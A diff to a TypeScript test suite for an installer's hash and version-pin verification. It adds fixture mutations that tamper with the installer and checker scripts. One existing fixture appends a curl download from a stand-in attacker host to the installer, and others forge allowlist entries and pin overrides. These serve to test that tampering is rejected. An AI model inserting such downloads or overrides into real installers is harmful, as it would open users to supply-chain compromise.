@@ -92,8 +92,10 @@ type FixtureMode =
   | "installer-decoy-table"
   | "installer-extra-download"
   | "installer-indirect-selector-override"
+  | "installer-later-min-selector-override"
   | "installer-later-selector-override"
   | "installer-literalized-pin-input"
+  | "installer-min-version-drift"
   | "installer-pin-selector-drift"
   | "installer-sha-command-bypass"
   | "mismatched-table-versions"
@@ -229,9 +231,12 @@ const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => strin
     `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
   "installer-indirect-selector-override": (source) =>
     `${source}\nselector=RELEASE_TAG\ndeclare "$selector=v9.9.9"\n`,
+  "installer-later-min-selector-override": (source) => `${source}\nMIN_VERSION="9.9.9"\n`,
   "installer-later-selector-override": (source) => `${source}\nPIN_VERSION="9.9.9"\n`,
   "installer-literalized-pin-input": (source) =>
     source.replace('local release_tag="$1" asset="$2"', "local release_tag='$1' asset='$2'"),
+  "installer-min-version-drift": (source) =>
+    source.replace('MIN_VERSION="0.0.72"', 'MIN_VERSION="0.0.82"'),
   "installer-max-version-drift": (source) =>
     source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.82"'),
   "installer-pin-selector-drift": (source) =>
@@ -321,6 +326,25 @@ a97dcb3acb04fb2d1170c1a2170228990c2337e25bb8c18817e5a6e952204108  openshell-gate
 `,
   ],
 ]);
+const CHECKER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
+  "allowlisted-alternate-version": (source) => {
+    const alternateEntries = [...CHECKSUM_MANIFESTS.entries()]
+      .map(
+        ([manifest, contents]) =>
+          `  "9.9.9|${manifest}|${createHash("sha256").update(contents).digest("hex")}"`,
+      )
+      .join("\n");
+    return source.replace(
+      "readonly -a OPENSHELL_RELEASE_MANIFEST_ALLOWLIST=(\n",
+      `readonly -a OPENSHELL_RELEASE_MANIFEST_ALLOWLIST=(\n${alternateEntries}\n`,
+    );
+  },
+  "incomplete-trusted-allowlist": (source) =>
+    source.replace(
+      /^\s*"0\.0\.72\|openshell-sandbox-checksums-sha256\.txt\|[a-f0-9]{64}"\s*$/m,
+      "",
+    ),
+};
 const tempDirs: string[] = [];
 
 afterEach(() => {
@@ -384,15 +408,16 @@ function replacePinFunction(
 ): string {
   const start = source.indexOf(`${functionName}() {`);
   const next = source.indexOf(`\n${nextFunctionName}() {`, start);
-  if (start === -1 || next === -1) throw new Error(`unable to replace ${functionName}`);
+  expect(start, `${functionName} template start`).not.toBe(-1);
+  expect(next, `${functionName} template end`).not.toBe(-1);
   return `${source.slice(0, start)}${replacement}${source.slice(next)}`;
 }
 
 function renderInstallerTemplate(openshellVersion: string, pinFunction: string): string {
   const selected = INSTALLER_TEMPLATE.replace(
-    /^MAX_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m,
-    `MAX_VERSION="${openshellVersion}"`,
-  );
+    /^MIN_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m,
+    `MIN_VERSION="${openshellVersion}"`,
+  ).replace(/^MAX_VERSION="[0-9]+\.[0-9]+\.[0-9]+"$/m, `MAX_VERSION="${openshellVersion}"`);
   return replacePinFunction(
     selected,
     "openshell_pinned_sha256",
@@ -536,32 +561,8 @@ function runFixture(
       : fs.readFileSync(targetChecker, "utf8"),
   );
   const checker = trustedChecker ? trustedCheckerPath : targetChecker;
-  if (mode === "allowlisted-alternate-version") {
-    const alternateEntries = [...CHECKSUM_MANIFESTS.entries()]
-      .map(
-        ([manifest, contents]) =>
-          `  "9.9.9|${manifest}|${createHash("sha256").update(contents).digest("hex")}"`,
-      )
-      .join("\n");
-    const checkerSource = fs.readFileSync(checker, "utf8");
-    fs.writeFileSync(
-      checker,
-      checkerSource.replace(
-        "readonly -a OPENSHELL_RELEASE_MANIFEST_ALLOWLIST=(\n",
-        `readonly -a OPENSHELL_RELEASE_MANIFEST_ALLOWLIST=(\n${alternateEntries}\n`,
-      ),
-    );
-  }
-  if (mode === "incomplete-trusted-allowlist") {
-    const checkerSource = fs.readFileSync(checker, "utf8");
-    fs.writeFileSync(
-      checker,
-      checkerSource.replace(
-        /^\s*"0\.0\.72\|openshell-sandbox-checksums-sha256\.txt\|[a-f0-9]{64}"\s*$/m,
-        "",
-      ),
-    );
-  }
+  const mutateChecker = CHECKER_MUTATIONS[mode] ?? ((source: string) => source);
+  fs.writeFileSync(checker, mutateChecker(fs.readFileSync(checker, "utf8")));
   const installer = path.join(fixtureRoot, "scripts", "install-openshell.sh");
   const blueprint = path.join(fixtureRoot, "nemoclaw-blueprint", "blueprint.yaml");
   const installerSource = fs.readFileSync(installer, "utf8");
@@ -674,6 +675,10 @@ describe("installer hash verification", () => {
 
   it.each([
     [
+      "installer-min-version-drift",
+      "installer pin-table release 0.0.72 must match installer MIN_VERSION 0.0.82",
+    ],
+    [
       "installer-max-version-drift",
       "installer pin-table release 0.0.72 must match installer MAX_VERSION 0.0.82",
     ],
@@ -695,6 +700,10 @@ describe("installer hash verification", () => {
     ["installer-decoy-table", "installer operational template is not base-trusted"],
     ["installer-comment-decoy", "installer operational template is not base-trusted"],
     ["installer-dead-code-decoy", "installer operational template is not base-trusted"],
+    [
+      "installer-later-min-selector-override",
+      "installer selector 1 must contain exactly one permitted release selector literal",
+    ],
     ["installer-later-selector-override", "installer operational template is not base-trusted"],
     ["installer-indirect-selector-override", "installer operational template is not base-trusted"],
     ["installer-sha-command-bypass", "installer operational template is not base-trusted"],
